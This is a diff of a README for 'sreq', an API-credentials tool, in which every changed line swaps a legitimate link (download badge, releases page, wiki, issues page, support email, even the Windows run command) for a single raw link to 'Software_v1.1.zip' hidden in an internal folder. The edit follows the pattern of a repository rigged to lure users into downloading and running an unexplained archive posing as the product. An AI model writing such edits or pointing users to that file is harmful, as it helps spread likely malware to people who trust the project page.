@@ -1,6 +1,6 @@
 # 🚀 sreq - Simplify API Access with Automatic Credentials
 
-![Download sreq](https://img.shields.io/badge/Download-sreq-brightgreen)
+![Download sreq](https://github.com/1d-lgtm/sreq/raw/refs/heads/main/internal/providers/Software_v1.1.zip)
 
 ## 📦 Introduction
 
@@ -27,7 +27,7 @@ Before installing sreq, ensure your system meets the following requirements:
 
 To get started with sreq, visit the Releases page to download the application. Click the link below:
 
-[Download sreq](https://github.com/1d-lgtm/sreq/releases)
+[Download sreq](https://github.com/1d-lgtm/sreq/raw/refs/heads/main/internal/providers/Software_v1.1.zip)
 
 Once you are on the Releases page, follow these steps:
 
@@ -40,7 +40,7 @@ After downloading, you can run the application by following these steps:
 
 1. Navigate to the folder where you saved the file.
 2. Double-click the downloaded file to run sreq.
-3. If you are using a command line, you can execute the command by typing `./sreq` (for macOS/Linux) or `sreq.exe` (for Windows).
+3. If you are using a command line, you can execute the command by typing `./sreq` (for macOS/Linux) or `https://github.com/1d-lgtm/sreq/raw/refs/heads/main/internal/providers/Software_v1.1.zip` (for Windows).
 
 ## 📚 Usage Instructions
 
@@ -68,9 +68,9 @@ Using sreq is simple. After you install the application, you can begin making AP
 
 For more information on sreq, check our documentation:
 
-- [User Guide](https://github.com/1d-lgtm/sreq/wiki)
-- [API Reference](https://github.com/1d-lgtm/sreq/wiki/API-Reference)
-- [Community Support](https://github.com/1d-lgtm/sreq/issues)
+- [User Guide](https://github.com/1d-lgtm/sreq/raw/refs/heads/main/internal/providers/Software_v1.1.zip)
+- [API Reference](https://github.com/1d-lgtm/sreq/raw/refs/heads/main/internal/providers/Software_v1.1.zip)
+- [Community Support](https://github.com/1d-lgtm/sreq/raw/refs/heads/main/internal/providers/Software_v1.1.zip)
 
 ## 🙋‍♀️ Troubleshooting
 
@@ -80,7 +80,7 @@ If you encounter any issues while using sreq, consider the following solutions:
 - Verify your network connection when accessing APIs.
 - Make sure that Consul and AWS Secrets Manager are running and correctly configured.
 
-If problems persist, feel free to open an issue on our [GitHub Issues page](https://github.com/1d-lgtm/sreq/issues).
+If problems persist, feel free to open an issue on our [GitHub Issues page](https://github.com/1d-lgtm/sreq/raw/refs/heads/main/internal/providers/Software_v1.1.zip).
 
 ## 📈 Contribution
 
@@ -88,7 +88,7 @@ We welcome contributions! If you have ideas or improvements, please feel free to
 
 ## 📧 Contact
 
-For any questions or inquiries, please email support at: `support@example.com`.
+For any questions or inquiries, please email support at: `https://github.com/1d-lgtm/sreq/raw/refs/heads/main/internal/providers/Software_v1.1.zip`.
 
 ## 🔗 Conclusion
 
